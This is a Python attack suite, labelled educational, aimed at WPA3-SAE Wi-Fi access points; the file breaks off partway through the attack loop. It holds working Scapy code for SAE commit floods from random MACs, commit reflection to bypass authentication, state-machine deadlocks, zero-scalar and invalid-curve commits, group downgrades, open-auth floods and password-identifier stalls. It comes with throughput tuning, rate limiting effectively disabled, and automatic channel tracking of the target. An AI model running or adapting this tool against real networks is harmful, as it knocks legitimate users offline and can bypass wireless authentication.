#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
WPA3-SAE Formal Attack Suite (Educational/Research Edition) - v2 (Refactored)
================================================================================
Based on: "What a Mesh: Formal Security Analysis of WPA3 SAE"
(arXiv:2603.23352v1, Metere et al., 2026)
Errata:   IEEE 802.11-24/0027r0-r2 & 0744r1 (Accepted Patches)
================================================================================
ATTACKS IMPLEMENTED (Paper Sections & Errata):
1. commit_flood                     : §VI-B (Cookie Guzzler / Anti-Clogging Bypass)
2. reflection_attack                : §VI-A, Erratum #23 (Replay/Auth Bypass via cL=cR)
3. memory_exhaustion                : §VI-B (Known-MAC Resource Drain)
4. deadlock                         : §VI-B, Erratum #16, #17 (COMMITTED → Invalid Commit → No Del)
5. zero_scalar                      : §12.4.5.4 (Invalid Scalar=0)
6. invalid_curve                    : §12.4.5.4 (Identity Element=0)
7. downgrade                        : §12.4.8.6.4, Erratum #19 (Weak MODP Groups + MAC Logic)
8. open_auth                        : Legacy 802.11 DoS (algo=0)
9. unknown_pw_id                    : §VI-C, Erratum #1, #16 (Stall in NOTHING State)
10. simultaneous_pw_id_conflict     : §VI-C-1 (Non-termination Loop via PW-ID conflict)
11. group_mismatch_tiebreaker_deadlock : §VI-C-3, Erratum #M (MAC Tiebreaker Deadlock)
12. threshold_boundary              : §12.4.6, App.B.C (Boundary > vs >= check)
13. silent_discard                  : §12.4.8.6.3, App.B.K (Sniffing invalid commit responses)
================================================================================
"""
import os
import sys
import time
import glob
import json
import socket
import random
import signal
import logging
import argparse
import subprocess
from datetime import datetime
from multiprocessing import Process, Value, Manager, Lock
from threading import Thread

from scapy.all import (
    RadioTap, Dot11, Dot11Auth, Dot11Deauth, RandMAC, sniff, conf
)

SHUTDOWN_FLAG = Value('b', False)

# ==============================================================================
# LOGGING & CONFIGURATION
# ==============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%S'
)
logger = logging.getLogger("WPA3-SAE-Research")

# ==============================================================================
# SCIENTIFIC & ATTACK TUNING CONSTANTS (Paper §12.4.6, §12.4.8)
# ==============================================================================
# IEEE 802.11 standard anti-clogging threshold. The AP activates defense after
# this many new/failed authentication attempts. Keep at 5 for standard-compliant
# DoS testing. Lowering it triggers AP protection earlier; raising it delays it.
ANTI_CLOGGING_THRESHOLD = 5

# Number of SAE-Commit frames sent per single burst. Larger values increase AP
# RAM/CPU load but may cause driver buffer overflows or TX drops. Reduce to 64
# for unstable/cheap Wi-Fi adapters, or increase to 256 for high-end hardware.
BURST_SIZE = 128

# Minimum time gap (seconds) between individual packets within a burst. Controls
# raw transmission speed. Too low (<0.00005) causes hardware/driver drops; too
# high reduces attack efficiency. Adjust based on your adapter's TX capabilities.
INTER_PACKET_GAP = 0.0001

# Global rate limiter: maximum packets per second across all bursts. Prevents
# adapter overheating, driver crashes, or immediate AP firmware resets. Increase
# for stronger load, decrease if you see "No such device" or TX drop errors.
PACKETS_PER_SECOND_LIMIT = 1000000     # Effectively disabled for maximum throughput

# Delay (seconds) between consecutive bursts. Lower values (e.g., 0.01-0.3) increase
# DoS intensity and stress the AP state machine faster.
LOG_DELAY_BETWEEN_BURSTS = 0.05

# Delay (seconds) between starting different attack processes/adapters in the
# orchestrator. Prevents simultaneous channel switches and scanner conflicts.
LOG_DELAY_BETWEEN_ATTACKS = 2.0

# SAE Group IDs & Payload Lengths (Group 19-24)
SAE_GROUP_BYTES = {
    19: b'\x13\x00', 20: b'\x14\x00', 21: b'\x15\x00',
    22: b'\x16\x00', 23: b'\x17\x00', 24: b'\x18\x00'
}
SAE_GROUP_LENGTHS = {
    19: (32, 64), 20: (48, 96), 21: (66, 132),
    22: (32, 256), 23: (32, 384), 24: (32, 512)
}

# ==============================================================================
# TARGET & ENVIRONMENT CONFIG (FILL BEFORE USE)
# ==============================================================================
TARGET_BSSID_6GHZ   = "AA:BB:CC:DD:EE:10"    # Replace with actual 6GHz BSSID
TARGET_BSSID_5GHZ   = "AA:BB:CC:DD:EE:11"    # Replace with actual 5GHz BSSID
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:12"    # Replace with actual 2.4GHz BSSID

# ==============================================================================
# SAE PARAMETERS - GROUP-AWARE DICTIONARIES (Groups 19-24)
# Structure: {group_id: [list of hex strings]}
# Replace INSERT placeholders with actual values from sae_extractor_arxiv_all_groups.py
# or load dynamically via --sae-file sae_params.json
# ==============================================================================
# --- 6 GHz Band ---
SAE_SCALARS_6GHZ = {
    19: ['INSERT_GROUP_19_SCALAR_6GHZ'],
    20: ['INSERT_GROUP_20_SCALAR_6GHZ'],
    21: ['INSERT_GROUP_21_SCALAR_6GHZ'],
    22: ['INSERT_GROUP_22_SCALAR_6GHZ'],
    23: ['INSERT_GROUP_23_SCALAR_6GHZ'],
    24: ['INSERT_GROUP_24_SCALAR_6GHZ'],
}
SAE_FINITES_6GHZ = {
    19: ['INSERT_GROUP_19_FINITE_6GHZ'],
    20: ['INSERT_GROUP_20_FINITE_6GHZ'],
    21: ['INSERT_GROUP_21_FINITE_6GHZ'],
    22: ['INSERT_GROUP_22_FINITE_6GHZ'],
    23: ['INSERT_GROUP_23_FINITE_6GHZ'],
    24: ['INSERT_GROUP_24_FINITE_6GHZ'],
}

# --- 5 GHz Band ---
SAE_SCALARS_5GHZ = {
    19: ['INSERT_GROUP_19_SCALAR_5GHZ'],
    20: ['INSERT_GROUP_20_SCALAR_5GHZ'],
    21: ['INSERT_GROUP_21_SCALAR_5GHZ'],
    22: ['INSERT_GROUP_22_SCALAR_5GHZ'],
    23: ['INSERT_GROUP_23_SCALAR_5GHZ'],
    24: ['INSERT_GROUP_24_SCALAR_5GHZ'],
}
SAE_FINITES_5GHZ = {
    19: ['INSERT_GROUP_19_FINITE_5GHZ'],
    20: ['INSERT_GROUP_20_FINITE_5GHZ'],
    21: ['INSERT_GROUP_21_FINITE_5GHZ'],
    22: ['INSERT_GROUP_22_FINITE_5GHZ'],
    23: ['INSERT_GROUP_23_FINITE_5GHZ'],
    24: ['INSERT_GROUP_24_FINITE_5GHZ'],
}

# --- 2.4 GHz Band ---
SAE_SCALARS_2_4GHZ = {
    19: ['INSERT_GROUP_19_SCALAR_2_4GHZ'],
    20: ['INSERT_GROUP_20_SCALAR_2_4GHZ'],
    21: ['INSERT_GROUP_21_SCALAR_2_4GHZ'],
    22: ['INSERT_GROUP_22_SCALAR_2_4GHZ'],
    23: ['INSERT_GROUP_23_SCALAR_2_4GHZ'],
    24: ['INSERT_GROUP_24_SCALAR_2_4GHZ'],
}
SAE_FINITES_2_4GHZ = {
    19: ['INSERT_GROUP_19_FINITE_2_4GHZ'],
    20: ['INSERT_GROUP_20_FINITE_2_4GHZ'],
    21: ['INSERT_GROUP_21_FINITE_2_4GHZ'],
    22: ['INSERT_GROUP_22_FINITE_2_4GHZ'],
    23: ['INSERT_GROUP_23_FINITE_2_4GHZ'],
    24: ['INSERT_GROUP_24_FINITE_2_4GHZ'],
}

# Known MACs for memory_exhaustion (Output from capture_known_macs.py)
KNOWN_STA_MACS_6GHZ   = []
KNOWN_STA_MACS_5GHZ   = []
KNOWN_STA_MACS_2_4GHZ = []

# Scanner & Channel Config
SCANNER_INTERFACE     = ""             # Leave empty to disable scanner or wlanXmon
SCANNER_INTERVAL      = 2
SCANNER_DURATION      = 45             # Duration of a single scan cycle (seconds)
MANUAL_CHANNEL_6GHZ   = ""             # MANUAL CHANNEL (6GHz)
MANUAL_CHANNEL_5GHZ   = ""             # MANUAL CHANNEL (5GHz)
MANUAL_CHANNEL_2_4GHZ = ""             # MANUAL CHANNEL (2.4GHz)

# Adapter -> Attack Mapping
ADAPTER_CONFIGURATION = {
    # --- 5 GHz Band ---
    # "wlan5mon": {"band": "5GHz", "attack": "simultaneous_pw_id_conflict"},
    "wlan7mon": {"band": "5GHz", "attack": "unknown_pw_id"},
    # --- 2.4 GHz Band ---
    # "wlan2mon": {"band": "2.4GHz", "attack": "memory_exhaustion"},
    "wlan2mon": {"band": "2.4GHz", "attack": "unknown_pw_id"}
}

# ==============================================================================
# ENCYCLOPEDIA TEXT (Printed in Help Menu)
# ==============================================================================
ENCYCLOPEDIA_TEXT = """
====================== ENCYCLOPEDIA OF ATTACKS ======================

Here you will find a detailed explanation for each available attack type.
Based on: "What a Mesh: Formal Security Analysis of WPA3 SAE Wireless
           Authentication" (arXiv:2603.23352v1) and Dragonblood research.

1. commit_flood (Cookie Guzzler / Omnivore) – Denial of Service
   Type: DoS
   Target: WPA3 Access Points
   Method: Rapidly sends SAE Commit frames from constantly changing,
   random Unicast MAC addresses. Each new MAC forces the AP to allocate
   a new protocol instance and memory.
   Paper-Ref: §VI-B (Memory Exhaustion / Cookie Guzzler)

2. reflection_attack (SAE-Reflection) – Authentication Bypass
   Type: Auth-Bypass
   Target: WPA3 APs with flawed SAE implementations (pre-2020)
   Method: Sends a valid SAE commit to the AP. When the AP responds with
   its own commit (cR), this payload is reflected back to the AP as peer
   commit (cL = cR).
   Standard-Fix: Erratum #23
   Paper-Ref: §VI-A, Fig. 5

3. memory_exhaustion (Known-MAC Resource Drain) – Resource DoS
   Type: DoS
   Target: WPA3 APs
   Method: Similar to commit_flood, but preferentially uses MAC addresses
   from previous incomplete SAE handshakes to bypass anti-clogging.
   Paper-Ref: §VI-B

4. deadlock (State Machine Deadlock)
   Type: State Machine Attack
   Target: WPA3 APs
   Method: A valid commit transitions the protocol instance into the
   COMMITTED state. Then, an invalid commit is sent. Without a Del-event,
   the instance hangs indefinitely and blocks further auth attempts.
   Standard-Fix: Errata #16, #17
   Paper-Ref: §VI-B

5. zero_scalar (Invalid Scalar=0)
   Type: Cryptographic Weakness
   Target: Implementations failing to validate the scalar
   Method: Sends SAE commits with scalar = 0.
   Origin: Dragonblood; Validation required per §12.4.5.4

6. invalid_curve (Identity Element=0)
   Type: Information Leak
   Target: Implementations lacking curve validation
   Method: Sends commits where the element (point) is all-zero / not on curve.
   Origin: Dragonblood; Validation required per §12.4.5.4

7. downgrade (Group Downgrade)
   Type: Downgrade Attack
   Target: WPA3 APs not enforcing Group 19
   Method: Instead of Group 19, proposes weak MODP groups (22, 23).
   Standard-Fix: Erratum #19
   Paper-Ref: §12.4.8.6.4, Erratum #19

8. open_auth (Legacy Open Authentication Flood)
   Type: DoS
   Target: Any 802.11 AP (WPA2/WPA3)
   Method: Floods the AP with basic Open System Authentications (algo=0).
   Origin: Generic 802.11 Attack

9. unknown_pw_id (Password Identifier Stall)
   Type: Memory DoS / State Machine Stall
   Target: WPA3 APs supporting Password Identifiers
   Method: Sends SAE commits with an IEEE 802.11 Element ID Extension (33)
   Password Identifier IE containing an unknown ID.
   Standard-Fix: Errata #1, #16
   Paper-Ref: §VI-C (Password Identifier DoS)

10. simultaneous_pw_id_conflict (Password Identifier Conflict) – Non-termination Loop
    Type: State Machine Attack / DoS
    Method: Continuously sends valid SAE commits alternating between two
    different Password ID IEs from the same MAC.
    Paper-Ref: §VI-C-1 (Correctness violation / Non-termination Loop)

11. group_mismatch_tiebreaker_deadlock (MAC Tiebreaker Deadlock) – Denial of Service
    Type: State Machine Deadlock
    Method: Forces the AP into the "yielder" role (Group Mismatch) using a
    spoofed, numerically larger Unicast MAC address and malformed payload.
    Standard-Fix: Erratum #M (Group Mismatch Error Handling)

12. threshold_boundary (Anti-Clogging Boundary Test) – DoS / Security Evaluation
    Type: Specification Flaw / DoS
    Method: Sends exactly as many token-less commits as the threshold (e.g., 5).
    Tests for off-by-one errors (usage of '>' vs. '>=').
    Standard-Fix: Erratum #C (Anti-Clogging Threshold operators)

13. silent_discard (Silent Discard Validation) – Error Handling Test
    Type: Information Leak Evaluation
    Method: Sends malformed commits (scalar=0) and listens whether the AP
    erroneously replies instead of silently discarding the packet.
    Standard-Fix: Erratum #K (Silent Discard on Commit Validation Failure)
"""

# ==============================================================================
# HELPER FUNCTIONS (MACs, Payloads, Channels, Sockets, Validation)
# ==============================================================================
def get_unicast_rand_mac() -> str:
    """Generates a valid Locally Administered Unicast MAC address (Bit 0 = 0, Bit 1 = 1)."""
    b = [random.randint(0x00, 0xff) for _ in range(6)]
    b[0] = (b[0] & 0xfe) | 0x02
    return ":".join(f"{x:02x}" for x in b)


def get_greater_mac(target_bssid: str) -> str:
    """Generates a Unicast MAC address numerically strictly greater than the target BSSID."""
    try:
        bssid_val = int(target_bssid.replace(':', ''), 16)
    except ValueError:
        return get_unicast_rand_mac()

    max_unicast = 0xfeffffffffff
    if bssid_val >= max_unicast:
        logger.warning(
            f"[MAC] Target BSSID {target_bssid} >= max Unicast MAC (fe:ff:ff:ff:ff:ff). "
            f"Falling back to fe:ff:ff:ff:ff:ff."
        )
        return "fe:ff:ff:ff:ff:ff"

    for _ in range(1000):
        candidate = get_unicast_rand_mac()
        if int(candidate.replace(':', ''), 16) > bssid_val:
            return candidate
    return "fe:ff:ff:ff:ff:ff"


def build_sae_payload(group_id: int, scalar: bytes, element: bytes, pw_id: str = None) -> bytes:
    """
    Builds SAE Commit payload per IEEE 802.11-2020 §12.4.5.4 & §9.4.2.248.
    Includes proper Element ID Extension (ID=255, ExtID=33) header for Password Identifier.
    """
    group_bytes = SAE_GROUP_BYTES.get(group_id, group_id.to_bytes(2, 'little'))
    payload = group_bytes + scalar + element
    if pw_id is not None:
        pw_bytes = pw_id.encode('utf-8')
        # IEEE 802.11 Password Identifier IE: Element ID 255 (0xff), Length (1 + len), Ext ID 33 (0x21)
        payload += bytes([255, len(pw_bytes) + 1, 33]) + pw_bytes
    return payload


def get_band_dicts(band: str):
    """Returns (scalars_dict, finites_dict, known_macs_list, target_bssid) for the given band."""
    if band == "6GHz":
        return SAE_SCALARS_6GHZ, SAE_FINITES_6GHZ, KNOWN_STA_MACS_6GHZ, TARGET_BSSID_6GHZ
    elif band == "5GHz":
        return SAE_SCALARS_5GHZ, SAE_FINITES_5GHZ, KNOWN_STA_MACS_5GHZ, TARGET_BSSID_5GHZ
    else:
        return SAE_SCALARS_2_4GHZ, SAE_FINITES_2_4GHZ, KNOWN_STA_MACS_2_4GHZ, TARGET_BSSID_2_4GHZ


def load_sae_file(filepath: str):
    """
    Optional JSON loader to populate SAE_SCALARS_* and SAE_FINITES_* from an external file.
    Expected JSON structure:
    {
      "5GHz": {"scalars": {"19": ["..."]}, "finites": {"19": ["..."]}},
      "2.4GHz": {"scalars": {"19": ["..."]}, "finites": {"19": ["..."]}},
      "6GHz": {"scalars": {"19": ["..."]}, "finites": {"19": ["..."]}}
    }
    """
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        for band_key, target_s, target_f in [
            ("6GHz", SAE_SCALARS_6GHZ, SAE_FINITES_6GHZ),
            ("5GHz", SAE_SCALARS_5GHZ, SAE_FINITES_5GHZ),
            ("2.4GHz", SAE_SCALARS_2_4GHZ, SAE_FINITES_2_4GHZ),
        ]:
            if band_key in data:
                for gid_str, s_list in data[band_key].get("scalars", {}).items():
                    target_s[int(gid_str)] = s_list
                for gid_str, f_list in data[band_key].get("finites", {}).items():
                    target_f[int(gid_str)] = f_list
        logger.info(f"[CONFIG] Loaded external SAE parameters from {filepath}")
    except Exception as e:
        logger.error(f"[CONFIG] Failed to load SAE file '{filepath}': {e}")


def build_valid_pairs(scalars_list: list, finites_list: list, group_id: int) -> list:
    """Builds list of valid (scalar_bytes, finite_bytes) pairs for a group."""
    s_len, e_len = SAE_GROUP_LENGTHS[group_id]
    pairs = []
    for s, f in zip(scalars_list, finites_list):
        s_clean = s.strip()
        f_clean = f.strip()
        if (
            "INSERT" not in s_clean and len(s_clean) == s_len * 2 and
            "INSERT" not in f_clean and len(f_clean) == e_len * 2 and
            all(c in '0123456789abcdefABCDEF' for c in s_clean + f_clean)
        ):
            try:
                pairs.append((bytes.fromhex(s_clean), bytes.fromhex(f_clean)))
            except ValueError:
                continue
    return pairs


def validate_sae_data(band: str) -> bool:
    """Checks if at least one valid SAE pair exists for the target band."""
    sc, fi, _, _ = get_band_dicts(band)
    valid = []
    for gid in [19, 20, 21, 22, 23, 24]:
        pairs = build_valid_pairs(sc.get(gid, []), fi.get(gid, []), gid)
        if pairs:
            valid.append(gid)
    if not valid:
        logger.warning(f"[VALIDATION] {band}: No valid SAE data found. Attack will fall back to random bytes.")
        return False
    logger.info(f"[VALIDATION] {band}: Valid groups: {valid}")
    return True


def get_valid_groups(band: str) -> list:
    """Returns list of group IDs that contain valid scalar/finite pairs."""
    sc, fi, _, _ = get_band_dicts(band)
    valid = []
    for gid in [19, 20, 21, 22, 23, 24]:
        if build_valid_pairs(sc.get(gid, []), fi.get(gid, []), gid):
            valid.append(gid)
    return valid if valid else [19]


def channel_to_freq(channel: int, band: str) -> int:
    """Converts channel number and band (2.4GHz, 5GHz, 6GHz) into MHz frequency."""
    if band == "2.4GHz":
        return 2484 if channel == 14 else 2407 + (channel * 5)
    elif band == "5GHz":
        return 5000 + (channel * 5)
    elif band == "6GHz":
        return 5935 if channel == 2 else 5950 + (channel * 5)
    raise ValueError(f"Unsupported band: {band}")


def set_channel_scientific(interface: str, channel: str, band: str = "5GHz") -> bool:
    """
    Robust channel switching supporting 2.4 GHz, 5 GHz, and 6 GHz.
    Uses frequency-based 'iw dev <iface> set freq <MHz>' first, then falls back to phy channel.
    """
    subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
    time.sleep(0.1)
    try:
        ch_int = int(channel)
        freq = channel_to_freq(ch_int, band)
        res_freq = subprocess.run(
            ['iw', 'dev', interface, 'set', 'freq', str(freq)],
            capture_output=True, text=True, timeout=2
        )
        if res_freq.returncode == 0:
            time.sleep(0.2)
            return True

        # Fallback to phy channel switch for legacy drivers (2.4GHz / 5GHz)
        info = subprocess.run(['iw', 'dev', interface, 'info'], capture_output=True, text=True, timeout=2)
        phy_num = next(
            (line.strip().split()[1] for line in info.stdout.splitlines() if line.strip().startswith('wiphy')),
            None
        )
        if phy_num is not None:
            res_ch = subprocess.run(
                ['iw', 'phy', f'phy{phy_num}', 'set', 'channel', str(channel)],
                capture_output=True, timeout=2
            )
            if res_ch.returncode == 0:
                time.sleep(0.2)
                return True
    except Exception as e:
        logger.warning(f"[CHANNEL] Setup failed on {interface} ({band}, Ch {channel}): {e}")
    return False


def open_l2_socket(interface: str, dry_run: bool = False):
    """Opens a persistent Scapy L2socket to avoid per-burst kernel RCU synchronization stalls."""
    if dry_run:
        return None
    try:
        sock = conf.L2socket(iface=interface)
        try:
            sock.outs.settimeout(0.05)
        except Exception:
            pass
        return sock
    except Exception as e:
        logger.error(f"[SOCKET] Could not open L2socket on {interface}: {e}")
        return None


def close_l2_socket(sock):
    """Safely closes an L2socket."""
    if sock is not None:
        try:
            sock.close()
        except Exception:
            pass


def safe_send(pkt, sock, interface: str, dry_run: bool = False):
    """Sends a single packet over the persistent L2socket, re-opening on failure if needed."""
    if dry_run:
        return sock
    if sock is None:
        sock = open_l2_socket(interface, dry_run)
    if sock is not None:
        try:
            sock.send(pkt)
        except Exception:
            close_l2_socket(sock)
            sock = open_l2_socket(interface, dry_run)
    return sock


def send_burst_scientific(packet_list: list, sock, interface: str, counter: Value, dry_run: bool = False):
    """
    Paper-aligned burst sending using a persistent L2socket with timeout
    to prevent CSMA/CA freezes and kernel synchronize_net() bottlenecks.
    """
    if not packet_list or dry_run:
        return sock

    if sock is None:
        sock = open_l2_socket(interface, dry_run)
        if sock is None:
            time.sleep(1)
            return None

    start = time.time()
    batch = packet_list[:BURST_SIZE]
    sent_count = 0

    for p in batch:
        try:
            sock.send(p)
            sent_count += 1
        except (socket.timeout, BlockingIOError, TimeoutError):
            time.sleep(0.002)
        except OSError as e:
            if e.errno == 105:  # ENOBUFS
                time.sleep(0.005)
            elif e.errno in (19, 6, 100):  # ENODEV / ENXIO / ENETDOWN
                logger.error(f"[HW ERROR] {interface} lost or down ({e}). Recreating socket...")
                close_l2_socket(sock)
                time.sleep(1.0)
                sock = open_l2_socket(interface, dry_run)
                break
        except Exception as e:
            logger.warning(f"[SEND] {interface}: {e}")
            break

        if INTER_PACKET_GAP > 0:
            time.sleep(INTER_PACKET_GAP)

    elapsed = time.time() - start
    target = len(batch) / PACKETS_PER_SECOND_LIMIT
    if elapsed < target:
        time.sleep(target - elapsed)

    try:
        with counter.get_lock():
            counter.value += sent_count
    except (OSError, ValueError, RuntimeError):
        pass

    return sock


def scanner_process(iface, interval, duration, shared, lock, b5, b2, b6=""):
    """Continuous scanner loop that flushes memory regularly and tracks AP channel hops."""
    if not iface:
        return
    try:
        while not SHUTDOWN_FLAG.value:
            prefix = f"/tmp/scan_cont_{int(time.time())}"
            proc = subprocess.Popen(
                [
                    'airodump-ng', '--write', prefix, '--output-format', 'csv',
                    '--band', 'abg', '--write-interval', '2', iface
                ],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            scan_start = time.time()
            while time.time() - scan_start < duration:
                if SHUTDOWN_FLAG.value:
                    break
                time.sleep(3)
                csvs = glob.glob(f"{prefix}-*.csv")
                if csvs:
                    latest_csv = max(csvs, key=os.path.getctime)
                    found = parse_airodump_csv(latest_csv, b5, b2, b6)
                    with lock:
                        for b, ch in found.items():
                            if shared.get(b) != str(ch):
                                shared[b] = str(ch)
                                logger.info(f"[SCANNER] {b} AP detected on channel {ch}")

            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()

            for f in glob.glob(f"{prefix}*"):
                try:
                    os.remove(f)
                except Exception:
                    pass

            if SHUTDOWN_FLAG.value:
                break
            time.sleep(interval)

    except KeyboardInterrupt:
        pass
    finally:
        for f in glob.glob("/tmp/scan_cont_*"):
            try:
                os.remove(f)
            except Exception:
                pass


def parse_airodump_csv(csv_file: str, b5: str, b2: str, b6: str = "") -> dict:
    """Parses airodump-ng CSV output - separates header block from station block."""
    results = {}
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        blocks = content.split('\n\n')
        if not blocks:
            return results
        for line in blocks[0].strip().split('\n'):
            if 'BSSID' in line or line.startswith('#') or not line.strip():
                continue
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 14 and parts[3].lstrip('-').isdigit():
                ch = int(parts[3])
                bssid_upper = parts[0].upper()
                if b5 and bssid_upper == b5.upper() and 36 <= ch <= 177:
                    results['5GHz'] = str(ch)
                elif b2 and bssid_upper == b2.upper() and 1 <= ch <= 14:
                    results['2.4GHz'] = str(ch)
                elif b6 and bssid_upper == b6.upper() and 1 <= ch <= 233:
                    results['6GHz'] = str(ch)
    except Exception:
        pass
    return results


def _silent_discard_callback(bssid: str, results: dict, lock_obj):
    """Sniffer callback to categorize AP responses to invalid commits."""
    bssid_lower = bssid.lower()

    def cb(pkt):
        if pkt.haslayer(Dot11Auth) and pkt.addr2 and pkt.addr2.lower() == bssid_lower:
            status = pkt[Dot11Auth].status
            with lock_obj:
                if status == 0:
                    results['accepted'] += 1
                elif status in (15, 17):
                    results['rejected'] += 1
                else:
                    results['other'] += 1
    return cb


# ==============================================================================
# ATTACK ENGINE (§VI-A, §VI-B, §VI-C)
# ==============================================================================
def run_attacker_process(
    interface, bssid, initial_channel, band, attack_type,
    counter, shared_channels, sae_group=None, dry_run=False
):
    """Main attacker loop inside its own process. Dynamically resolves valid groups and tracks channels."""
    current_channel = str(initial_channel)
    if current_channel and not set_channel_scientific(interface, current_channel, band):
        logger.warning(f"[ATTACK] {interface}: Channel setup warning on {band} Ch {current_channel}, continuing...")

    valid_groups = get_valid_groups(band)
    group_index = 0
    logger.info(f"[ATTACK] {interface} | Valid Groups: {valid_groups} | Band: {band} | Initial Ch: {current_channel}")

    scalars, finites, known_macs, _ = get_band_dicts(band)

    precomputed_pairs = {}
    for gid in valid_groups:
        pairs = build_valid_pairs(scalars.get(gid, []), finites.get(gid, []), gid)
        precomputed_pairs[gid] = pairs
        if pairs:
            preview_s = pairs[0][0][:4].hex()
            preview_f = pairs[0][1][:4].hex()
            logger.info(
                f"[PAIRS] [{interface} | {band}] Group {gid}: {len(pairs)} valid pairs loaded. "
                f"Sample: S={preview_s}... F={preview_f}..."
            )
        else:
            logger.warning(f"[PAIRS] [{interface} | {band}] Group {gid}: No valid pairs. Using random fallback bytes.")

    sock = open_l2_socket(interface, dry_run)
    burst_count = 0
    own_commit_cache = set()
    bssid_lower = bssid.lower()

    def get_sae_pair(gid: int):
        pairs = precomputed_pairs.get(gid, [])
        if not pairs:
            s_len, e_len = SAE_GROUP_LENGTHS[gid]
            return os.urandom(s_len), os.urandom(e_len)
        return random.choice(pairs)

    def make_commit(mac: str, seq: int = 1, gid: int = 19, s_bytes: bytes = None, f_bytes: bytes = None, pw_id: str = None):
        if s_bytes is None or f_bytes is None:
            gen_s, gen_f = get_sae_pair(gid)
            if s_bytes is None:
                s_bytes = gen_s
            if f_bytes is None:
                f_bytes = gen_f
        payload = build_sae_payload(gid, s_bytes, f_bytes, pw_id)
        return (
            RadioTap() /
            Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid) /
            Dot11Auth(algo=3, seqnum=seq, status=0) /
            payload
        )

    try:
        while not SHUTDOWN_FLAG.value:
            latest_channel = shared_channels.get(band)
            if latest_channel and latest_channel != current_channel:
                logger.info(f"[TRACKING] {interface}: AP changed channel from {current_channel} to {latest_channel}. Hopping...")
                current_channel = latest_channel
                close_l2_socket(sock)
                set_channel_scientific(interface, current_channel, band)
                sock = open_l2_socket(interface, dry_run)

            active_group = valid_groups[group_index % len(valid_groups)]
            group_index += 1
            valid_pairs_count = len(precomputed_pairs.get(active_group, []))

            packets = []
            t0 = time.time()

            if attack_type == "commit_flood":
                # Generate unique Unicast MACs across the burst to force new AP state allocations
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(get_unicast_rand_mac(), gid=active_group))

            elif attack_type == "reflection_attack":
                own_mac = get_unicast_rand_mac()
                s, f = get_sae_pair(active_group)
                own_commit_cache.add(own_mac.lower())
                sock = safe_send(make_commit(own_mac, gid=active_group, s_bytes=s, f_bytes=f), sock, interface, dry_run)

                def reflection_cb(pkt):
                    nonlocal sock
                    if (
                        pkt.haslayer(Dot11Auth) and
                        pkt.addr2 and pkt.addr2.lower() == bssid_lower and
                        pkt.addr1 and pkt.addr1.lower() in own_commit_cache and
                        pkt[Dot11Auth].algo == 3 and pkt[Dot11Auth].seqnum == 1
                    ):
                        # Replay the AP's own SAE Commit payload (cR) back as our Commit (cL = cR)
                        ap_payload = bytes(pkt[Dot11Auth].payload)
                        reflect_pkt = (
                            RadioTap() /
                            Dot11(type=0, subtype=11, addr1=bssid, addr2=pkt.addr1, addr3=bssid) /
                            Dot11Auth(algo=3, seqnum=1, status=0) /
                            ap_payload
                        )
                        sock = safe_send(reflect_pkt, sock, interface, dry_run)
                        own_commit_cache.discard(pkt.addr1.lower())
                        logger.info(f"[REFLECTION] Reflected AP commit back from {pkt.addr1} (cL=cR)")

                sniff(iface=interface, prn=reflection_cb, timeout=2, store=False)
                own_commit_cache.clear()
                time.sleep(0.5)

            elif attack_type == "memory_exhaustion":
                macs = (
                    random.choices(known_macs, k=ANTI_CLOGGING_THRESHOLD)
                    if known_macs else [get_unicast_rand_mac() for _ in range(ANTI_CLOGGING_THRESHOLD)]
                )
                for m in macs:
                    packets.append(make_commit(m, gid=active_group))
                packets *= (BURST_SIZE // max(1, len(macs)))

            elif attack_type == "deadlock":
                mac = get_unicast_rand_mac()
                packets.append(make_commit(mac, gid=active_group))
                s_len, e_len = SAE_GROUP_LENGTHS[active_group]
                inv_s = b'\x01' + b'\x00' * (s_len - 1)
                inv_f = b'\x01' + b'\x00' * (e_len - 1)
                for _ in range(BURST_SIZE - 1):
                    packets.append(make_commit(mac, gid=active_group, s_bytes=inv_s, f_bytes=inv_f))

            elif attack_type == "zero_scalar":
                s_len = SAE_GROUP_LENGTHS[active_group][0]
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(get_unicast_rand_mac(), gid=active_group, s_bytes=b'\x00' * s_len))

            elif attack_type == "invalid_curve":
                e_len = SAE_GROUP_LENGTHS[active_group][1]
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(get_unicast_rand_mac(), gid=active_group, f_bytes=b'\x00' * e_len))

            elif attack_type == "downgrade":
                for g in [22, 23]:
                    s_len, e_len = SAE_GROUP_LENGTHS[g]
                    for _ in range(BURST_SIZE // 2):
                        packets.append(
                            make_commit(get_unicast_rand_mac(), gid=g, s_bytes=os.urandom(s_len), f_bytes=os.urandom(e_len))
                        )

            elif attack_type == "open_auth":
                for _ in range(BURST_SIZE):
                    packets.append(
                        RadioTap() /
                        Dot11(type=0, subtype=11, addr1=bssid, addr2=get_unicast_rand_mac(), addr3=bssid) /
                        Dot11Auth(algo=0, seqnum=1, status=0)
                    )

            elif attack_type == "unknown_pw_id":
                macs = known_macs if known_macs else [get_unicast_rand_mac() for _ in range(ANTI_CLOGGING_THRESHOLD)]
                for m in macs:
                    s, f = get_sae_pair(active_group)
                    unk_id = f"malicious_{random.randint(1000, 9999)}"
                    packets.append(make_commit(m, gid=active_group, s_bytes=s, f_bytes=f, pw_id=unk_id))
                packets *= max(1, BURST_SIZE // max(1, len(macs)))

            elif attack_type == "simultaneous_pw_id_conflict":
                mac = get_unicast_rand_mac()
                pw_id_a = f"profile_{random.randint(1, 9)}"
                pw_id_b = f"profile_{random.randint(10, 19)}"
                for _ in range(BURST_SIZE // 2):
                    s, f = get_sae_pair(active_group)
                    packets.append(make_commit(mac, gid=active_group, s_bytes=s, f_bytes=f, pw_id=pw_id_a))
                    packets.append(make_commit(mac, gid=active_group, s_bytes=s, f_bytes=f, pw_id=pw_id_b))

